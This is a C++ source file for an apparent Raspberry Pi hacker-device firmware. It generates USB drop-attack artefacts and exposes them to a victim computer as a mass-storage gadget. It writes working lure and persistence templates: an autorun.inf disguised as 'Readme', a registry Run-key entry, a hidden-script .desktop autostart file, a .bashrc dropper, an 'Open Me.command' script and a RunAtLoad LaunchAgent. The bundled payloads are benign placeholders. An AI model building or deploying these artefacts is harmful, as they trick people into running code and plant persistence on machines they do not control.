// app_drop.cpp — USB drop-attack artefact generator (Raspberry Pi 5)
//
// Generates autorun artefacts for Windows/Linux/macOS targets and
// exposes them via USB Mass Storage Gadget (configfs/libcomposite).
//
// Requires in /boot/firmware/config.txt:
//   dtoverlay=dwc2
//   dr_mode=otg
//
// The gadget is created at /sys/kernel/config/usb_gadget/g0/ and
// the loot files are served from a backing file (fat.img).

#include "app_drop.h"
#include "../UI/draw.h"
#include "../UI/theme.h"
#include "../hal/hal_storage.h"
#include "../config.h"
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>

#ifdef VOIDOS_RPI5
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <dirent.h>
#include <errno.h>
#endif

#ifdef VOIDOS_RPI5

//consts
#define LOOT_DIR        "/mnt/void-os/loot"
#define GADGET_BASE     "/sys/kernel/config/usb_gadget/g0"
#define GADGET_MOUNT    "/mnt/void-os/gadget"
#define FAT_IMG_PATH    "/mnt/void-os/fat.img"
#define FAT_IMG_SIZE    (4 * 1024 * 1024)   // 4 MB backing image

#define TARGET_NAME_LEN 24
#define PAYLOAD_PATH_LEN 128
#define PAYLOAD_BUF_SIZE 2048

//templates
enum TargetID : uint8_t {
    TGT_WIN_AUTORUN = 0,
    TGT_WIN_REGEDIT = 1,
    TGT_LIN_DESKTOP = 2,
    TGT_LIN_BASHRC  = 3,
    TGT_MAC_COMMAND = 4,
    TGT_MAC_LAUNCH  = 5,
    TGT_GENERIC     = 6,
    TGT_HID_ONLY    = 7,
};

struct TargetInfo {
    TargetID    id;
    const char  label[TARGET_NAME_LEN];
    const char  description[48];
};

static const TargetInfo TARGETS[] = {
    { TGT_WIN_AUTORUN, "WIN-AUTORUN",  "autorun.inf + payload.exe" },
    { TGT_WIN_REGEDIT, "WIN-REGEDIT",  "registry-on-connect .reg" },
    { TGT_LIN_DESKTOP, "LIN-DESKTOP",  ".desktop file autostart" },
    { TGT_LIN_BASHRC,  "LIN-BASHRC",   ".bashrc dropper snippet" },
    { TGT_MAC_COMMAND, "MAC-COMMAND",  ".command shell script" },
    { TGT_MAC_LAUNCH,  "MAC-LAUNCH",   "LaunchAgents plist" },
    { TGT_GENERIC,     "GENERIC",      "plain payload copy" },
    { TGT_HID_ONLY,    "HID-ONLY",     "no artefact (HID inject)" },
};
static const uint8_t N_TARGETS = sizeof(TARGETS) / sizeof(TARGETS[0]);

//menu
static const char *LABELS[] = { "TARGET", "PAYLOAD", "BUILD", "DROP" };
static const uint8_t N_ROWS = 4;

//state
static uint8_t  _row       = 0;
static char     _status[32] = "READY";
static uint8_t  _tgt_sel   = 0;
static bool     _gadget_on = false;
static bool     _built     = false;

// Payload text buffer (operator edits via POT + buttons or from storage)
static char     _payload[PAYLOAD_BUF_SIZE] =
    "#!/bin/bash\n"
    "echo 'placeholder payload' > /tmp/drop_test.txt\n";

// Preset payload library (loaded from hal_storage on init)
#define PAYLOAD_SLOTS 8
#define PAYLOAD_SLOT_LEN 256
static char     _payloads[PAYLOAD_SLOTS][PAYLOAD_SLOT_LEN];
static uint8_t  _payload_count = 0;
static uint8_t  _payload_sel   = 0;

//persıstence
static void load_config() {
    _tgt_sel   = hal_storage_get_u8("drop_tgt", 0);
    _payload_sel = hal_storage_get_u8("drop_psel", 0);
    char buf[PAYLOAD_BUF_SIZE];
    if (hal_storage_get_str("drop_payload", buf, sizeof(buf)))
        std::snprintf(_payload, sizeof(_payload), "%s", buf);

    _payload_count = 0;
    for (uint8_t i = 0; i < PAYLOAD_SLOTS; ++i) {
        char key[12];
        std::snprintf(key, sizeof(key), "drop_pl_%u", i);
        if (hal_storage_get_str(key, _payloads[_payload_count], PAYLOAD_SLOT_LEN))
            _payload_count++;
    }
    if (!_payload_count) {
        // Seed defaults
        std::snprintf(_payloads[0], PAYLOAD_SLOT_LEN,
                      "#!/bin/bash\nid > /tmp/drop.txt\n");
        std::snprintf(_payloads[1], PAYLOAD_SLOT_LEN,
                      "@echo off\nipconfig > drop.txt\n");
        std::snprintf(_payloads[2], PAYLOAD_SLOT_LEN,
                      "#!/bin/sh\nosascript -e 'tell app \"Terminal\" to do script \"ls\"'\n");
        _payload_count = 3;
    }
}

static void save_config() {
    hal_storage_set_u8("drop_tgt", _tgt_sel);
    hal_storage_set_u8("drop_psel", _payload_sel);
    hal_storage_set_str("drop_payload", _payload);
    for (uint8_t i = 0; i < _payload_count && i < PAYLOAD_SLOTS; ++i) {
        char key[12];
        std::snprintf(key, sizeof(key), "drop_pl_%u", i);
        hal_storage_set_str(key, _payloads[i]);
    }
    hal_storage_commit();
}

//fıle system helpers
static void ensure_dir(const char *dir) { mkdir(dir, 0755); }

static void write_file(const char *path, const char *data, size_t len) {
    FILE *fp = fopen(path, "w");
    if (!fp) return;
    fwrite(data, 1, len, fp);
    fclose(fp);
}

static void rm_rf(const char *path) {
    char cmd[256];
    std::snprintf(cmd, sizeof(cmd), "rm -rf %s", path);
    system(cmd);
}

//template builder
static uint64_t utc_now() { return (uint64_t)time(nullptr); }

static void build_win_autorun(const char *dir) {
    // autorun.inf
    char buf[256];
    int n = std::snprintf(buf, sizeof(buf),
        "[autorun]\r\n"
        "open=payload.exe\r\n"
        "action=Open folder to view files\r\n"
        "icon=shell32.dll,4\r\n"
        "label=Readme\r\n");
    char path[256];
    std::snprintf(path, sizeof(path), "%s/autorun.inf", dir);
    write_file(path, buf, n);

    // Write the payload as a .bat (can't write real .exe from userspace
    // without PE tools, so we ship a .bat the operator renames or
    // a PowerShell one-liner)
    std::snprintf(path, sizeof(path), "%s/payload.bat", dir);
    write_file(path, _payload, std::strlen(_payload));
}

static void build_win_regedit(const char *dir) {
    char buf[512];
    int n = std::snprintf(buf, sizeof(buf),
        "Windows Registry Editor Version 5.00\r\n\r\n"
        "; Payload runs on next logon\r\n"
        "[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n"
        "\"DropPayload\"=\"cmd.exe /c %%TEMP%%\\\\payload.bat\"\r\n");
    char path[256];
    std::snprintf(path, sizeof(path), "%s/payload.reg", dir);
    write_file(path, buf, n);

    // Companion bat
    std::snprintf(path, sizeof(path), "%s/payload.bat", dir);
    write_file(path, _payload, std::strlen(_payload));
}

static void build_lin_desktop(const char *dir) {
    char buf[512];
    int n = std::snprintf(buf, sizeof(buf),
        "[Desktop Entry]\n"
        "Type=Application\n"
        "Name=Readme\n"
        "Exec=/tmp/.payload.sh\n"
        "Icon=system-help\n"
        "Terminal=false\n"
        "X-GNOME-Autostart-enabled=true\n");
    char path[256];
    std::snprintf(path, sizeof(path), "%s/Readme.desktop", dir);
    write_file(path, buf, n);

    std::snprintf(path, sizeof(path), "%s/.payload.sh", dir);
    write_file(path, _payload, std::strlen(_payload));
    chmod(path, 0755);
}

static void build_lin_bashrc(const char *dir) {
    // Drop a .bashrc snippet — when user opens terminal it runs
    char buf[PAYLOAD_BUF_SIZE + 256];
    int n = std::snprintf(buf, sizeof(buf),
        "# %s\n# Paste into ~/.bashrc or place in ~/.bash_aliases\n\n%s\n",
        "VoidOS drop payload", _payload);
    char path[256];
    std::snprintf(path, sizeof(path), "%s/.bash_aliases", dir);
    write_file(path, buf, n);
}

static void build_mac_command(const char *dir) {
    char buf[PAYLOAD_BUF_SIZE + 64];
    int n = std::snprintf(buf, sizeof(buf), "#!/bin/sh\n%s", _payload);
    char path[256];
    std::snprintf(path, sizeof(path), "%s/Open Me.command", dir);
    write_file(path, buf, n);
    chmod(path, 0755);
}

static void build_mac_launch(const char *dir) {
    char buf[512];
    uint64_t now = utc_now();
    int n = std::snprintf(buf, sizeof(buf),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>Label</key>\n"
        "  <string>com.voidos.drop%lu</string>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array>\n"
        "    <string>/bin/sh</string>\n"
        "    <string>/tmp/.drop_payload.sh</string>\n"
        "  </array>\n"
        "  <key>RunAtLoad</key>\n"
        "  <true/>\n"
        "</dict>\n"
        "</plist>\n", (unsigned long)now);
    char path[256];
    std::snprintf(path, sizeof(path),
        "%s/com.voidos.drop%lu.plist", dir, (unsigned long)now);
    write_file(path, buf, n);
}

static void build_generic(const char *dir) {
    char path[256];
    std::snprintf(path, sizeof(path), "%s/payload.sh", dir);
    write_file(path, _payload, std::strlen(_payload));
    chmod(path, 0755);

    // README
    char readme[256];
    int n = std::snprintf(readme, sizeof(readme),
        "Generated by Void-OS USB Drop Generator\n"
        "Timestamp: %lu\nTarget: %s\n",
        (unsigned long)utc_now(), TARGETS[_tgt_sel].label);
    std::snprintf(path, sizeof(path), "%s/README.txt", dir);
    write_file(path, readme, n);
}

typedef void (*BuildFn)(const char *dir);
static const BuildFn BUILDERS[] = {
    build_win_autorun,  // TGT_WIN_AUTORUN
    build_win_regedit,  // TGT_WIN_REGEDIT
    build_lin_desktop,  // TGT_LIN_DESKTOP
    build_lin_bashrc,   // TGT_LIN_BASHRC
    build_mac_command,  // TGT_MAC_COMMAND
    build_mac_launch,   // TGT_MAC_LAUNCH
    build_generic,      // TGT_GENERIC
    nullptr,            // TGT_HID_ONLY — no artefacts
};

static bool do_build() {
    if (_tgt_sel >= N_TARGETS || !BUILDERS[_tgt_sel]) {
        std::snprintf(_status, sizeof(_status), "no artefact needed");
        return false;
    }

    // Clean + recreate the loot staging dir
    rm_rf(LOOT_DIR);
    ensure_dir(LOOT_DIR);

    // Run the template builder
    BUILDERS[_tgt_sel](LOOT_DIR);

    _built = true;
    std::snprintf(_status, sizeof(_status), "BUILT: %s",
                  TARGETS[_tgt_sel].label);
    return true;
}

//USB gadget (configs / libcomp)
static void sysfs_write(const char *path, const char *val) {
    int fd = open(path,  O_WRONLY);
    if (fd < 0) return;
    write(fd, val, std::strlen(val));
    close(fd);
}

static bool gadget_enable() {
    if (_gadget_on) return true;

    // 1. Create backing fat image if missing
    struct stat st;
    if (stat(FAT_IMG_PATH, &st) != 0) {
        char cmd[256];
        std::snprintf(cmd, sizeof(cmd),
            "dd if=/dev/zero of=%s bs=1M count=4 2>/dev/null && "
            "mkfs.vfat -F 32 %s 2>/dev/null",
            FAT_IMG_PATH, FAT_IMG_PATH);
        system(cmd);
    }

    // 2. Create gadget skeleton via configfs
    ensure_dir(GADGET_BASE);
    sysfs_write("/sys/kernel/config/usb_gadget/UDC",
                "");  // unbind first

    sysfs_write(GADGET_BASE "/idVendor",  "0x1d6b");  // Linux Foundation
    sysfs_write(GADGET_BASE "/idProduct", "0x0104");
    sysfs_write(GADGET_BASE "/bcdUSB",    "0x0200");
    sysfs_write(GADGET_BASE "/bMaxPacketSize0", "64");

    // Strings
    ensure_dir(GADGET_BASE "/strings/0x409");
    sysfs_write(GADGET_BASE "/strings/0x409/manufacturer", "Void-OS");
    sysfs_write(GADGET_BASE "/strings/0x409/product",      "USB Drop Device");
    sysfs_write(GADGET_BASE "/strings/0x409/serialnumber",  "42");

    // Mass Storage function
    ensure_dir(GADGET_BASE "/functions/mass_storage.usb0");
    sysfs_write(GADGET_BASE "/functions/mass_storage.usb0/lun/file",
                FAT_IMG_PATH);
    sysfs_write(GADGET_BASE "/functions/mass_storage.usb0/lun/ro", "0");

    // Configuration
    ensure_dir(GADGET_BASE "/configs/c.1/strings/0x409");
    sysfs_write(GADGET_BASE "/configs/c.1/strings/0x409/configuration",
                "Mass Storage");
    ensure_dir(GADGET_BASE "/configs/c.1/mass_storage.usb0");
    // Symlink created automatically or via ln -s
    char link_cmd[256];
    std::snprintf(link_cmd, sizeof(link_cmd),
        "ln -sf %s/functions/mass_storage.usb0 "
        "%s/configs/c.1/mass_storage.usb0",
        GADGET_BASE, GADGET_BASE);
    system(link_cmd);

    // 3. Copy loot files into the fat image
    ensure_dir(GADGET_MOUNT);
    std::snprintf(link_cmd, sizeof(link_cmd),
        "mount -o loop,offset=0 %s %s 2>/dev/null", FAT_IMG_PATH, GADGET_MOUNT);
    if (system(link_cmd) == 0) {
        // Copy everything from LOOT_DIR into the mount
        std::snprintf(link_cmd, sizeof(link_cmd),
            "cp -a %s/* %s/ 2>/dev/null", LOOT_DIR, GADGET_MOUNT);
        system(link_cmd);
        system("sync");
        umount(GADGET_MOUNT);
    }

    // 4. Bind the UDC to activate the gadget
    // Find the first available UDC
    FILE *fp = popen("ls /sys/class/udc/ | head -1", "r");
    char udc[64] = "";
    if (fp) {
        fgets(udc, sizeof(udc), fp);
        // Strip trailing newline
        size_t len = std::strlen(udc);
        if (len > 0 && udc[len-1] == '\n') udc[len-1] = 0;
        pclose(fp);
    }
    if (udc[0]) {
        sysfs_write(GADGET_BASE "/UDC", udc);
    } else {
        std::snprintf(_status, sizeof(_status), "NO UDC FOUND");
        return false;
    }

    _gadget_on = true;
    std::snprintf(_status, sizeof(_status), "USB: ACTIVE");
    return true;
}

static void gadget_disable() {
    if (!_gadget_on) return;
    sysfs_write(GADGET_BASE "/UDC", "");
    _gadget_on = false;
    std::snprintf(_status, sizeof(_status), "USB: OFF");
}

//lifecycle 
void app_drop_init() {
    _row = 0;
    _built = false;
    _gadget_on = false;
    load_config();
    std::snprintf(_status, sizeof(_status), "READY");
}

void app_drop_tick() {
    // Nothing to pump — build is synchronous, gadget is persistent.
}

void app_drop_suspend() {
    gadget_disable();
    save_config();
    _built = false;
}

//event handle
void app_drop_event(Event e) {
    if (e.type == EVT_BTN_B_DOWN) {
        std::snprintf(_status, sizeof(_status), "READY");
        return;
    }

    if (e.type == EVT_POT_CHANGED) {
        if (_row == 0) {
            // POT scrolls targets
            _tgt_sel = (e.data * N_TARGETS) / 256;
            if (_tgt_sel >= N_TARGETS) _tgt_sel = N_TARGETS - 1;
            _built = false;  // target changed, rebuild needed
        } else if (_row == 1) {
            // POT scrolls payload presets
            if (_payload_count > 0) {
                _payload_sel = (e.data * _payload_count) / 256;
                if (_payload_sel >= _payload_count)
                    _payload_sel = _payload_count - 1;
                std::snprintf(_payload, sizeof(_payload), "%s",
                              _payloads[_payload_sel]);
                _built = false;
            }
        }
        return;
    }

    if (e.type == EVT_BTN_A_DOWN) {
        switch (_row) {
            case 0:  // TARGET — cycle to next target
                _tgt_sel = (_tgt_sel + 1) % N_TARGETS;
                _built = false;
                std::snprintf(_status, sizeof(_status), ">%s",
                              TARGETS[_tgt_sel].label);
                break;

            case 1:  // PAYLOAD — cycle preset or confirm edit
                if (_payload_count > 0) {
                    _payload_sel = (_payload_sel + 1) % _payload_count;
                    std::snprintf(_payload, sizeof(_payload), "%s",
                                  _payloads[_payload_sel]);
                    _built = false;
                    std::snprintf(_status, sizeof(_status), "PL[%u/%u]",
                                  _payload_sel, _payload_count);
                }
                break;

            case 2:  // BUILD — generate artefact files
                if (do_build()) {
                    // success, status set by do_build()
                }
                break;

            case 3:  // DROP — toggle USB gadget on/off
                if (_gadget_on) {
                    gadget_disable();
                } else {
                    if (!_built) {
                        if (!do_build()) break;
                    }
                    gadget_enable();
                }
                break;
        }
        return;
    }

    if (e.type == EVT_BTN_C_DOWN) {
        // C = emergency disconnect gadget
        gadget_disable();
        std::snprintf(_status, sizeof(_status), "EJECT: OK");
        return;
    }
}

//draw
void app_drop_draw() {
    draw_fill(0, 0, SCR_W, SCR_H, T_BG);
    draw_fill(0, 0, SCR_W, STATS_H, T_PANEL);
    draw_hline(0, STATS_H, SCR_W, T_BORDER);
    draw_text(8, 8, "DROP / USB", T_FG, T_PANEL, FONT_SM);

    // Status indicators in the top bar
    draw_textf(SCR_W - 100, 8, _gadget_on ? T_WARN : T_DIM,
               T_PANEL, FONT_SM, "USB:%s",
               _gadget_on ? "ON" : "off");
    draw_textf(SCR_W - 48, 8, _built ? T_FG : T_DIM,
               T_PANEL, FONT_SM, "BLD:%s",
               _built ? "OK" : "--");

    // Menu rows
    int row_h = 26;
    for (uint8_t i = 0; i < N_ROWS; ++i) {
        int y = STATS_H + 8 + (int)i * row_h;
        uint16_t color = T_DIM;
        if (i == _row) color = T_FG;
        if (_gadget_on && i == 3) color = T_WARN;

        const char *extra = "";
        char extra_buf[32];
        if (i == 0) {
            std::snprintf(extra_buf, sizeof(extra_buf), " → %s",
                          TARGETS[_tgt_sel].label);
            extra = extra_buf;
        } else if (i == 1) {
            std::snprintf(extra_buf, sizeof(extra_buf), " [%u/%u]",
                          _payload_sel, _payload_count);
            extra = extra_buf;
        } else if (i == 3 && _gadget_on) {
            extra = " [EJECT=C]";
        }

        draw_textf(8, y, color, T_BG, FONT_SM, "%s %s%s",
                   (i == _row) ? ">" : " ", LABELS[i], extra);
    }

    // Info panel — show target description
    int info_y = STATS_H + 8 + N_ROWS * row_h + 4;
    if (_row == 0) {
        draw_textf(8, info_y, T_FG, T_BG, FONT_SM, "%s",
                   TARGETS[_tgt_sel].description);
    } else if (_row == 1) {
        // Show first 2 lines of the current payload
        char line1[64] = "", line2[64] = "";
        const char *p = _payload;
        int i = 0;
        while (*p && *p != '\n' && i < 60) line1[i++] = *p++;
        line1[i] = 0;
        if (*p == '\n') p++;
        i = 0;
        while (*p && *p != '\n' && i < 60) line2[i++] = *p++;
        line2[i] = 0;
        draw_textf(8, info_y,     T_DIM, T_BG, FONT_SM, "%s", line1);
        draw_textf(8, info_y + 12, T_DIM, T_BG, FONT_SM, "%s", line2);
    } else {
        draw_textf(8, info_y, T_DIM, T_BG, FONT_SM,
                   "template: %s", TARGETS[_tgt_sel].label);
    }

    // Status bar
    draw_textf(8, SCR_H - 28, _gadget_on ? T_WARN : T_DIM,
               T_BG, FONT_SM, "%s", _status);
    draw_hline(0, SCR_H - 16, SCR_W, T_BORDER);
    draw_text(8, SCR_H - 12,
              "[A] SEL/TOG  [C] EJECT  [B] BACK  POT=row/scroll",
              T_DIM, T_BG, FONT_SM);
}

#else  // ESP32 — USB gadget requires Linux configfs
static char _stub_status[24] = "DROP: LINUX ONLY";

void app_drop_init() {
    std::snprintf(_stub_status, sizeof(_stub_status), "DROP: LINUX ONLY");
}
void app_drop_tick() {}
void app_drop_suspend() {}
void app_drop_event(Event e) { (void)e; }
void app_drop_draw() {
    draw_fill(0, 0, SCR_W, SCR_H, T_BG);
    draw_text(8, 8, "DROP / USB", T_FG, T_BG, FONT_SM);
    draw_text(8, 44, _stub_status, T_WARN, T_BG, FONT_SM);
    draw_text(8, 62, "Needs configfs (Pi 5)", T_DIM, T_BG, FONT_SM);
}
#endif  // VOIDOS_RPI5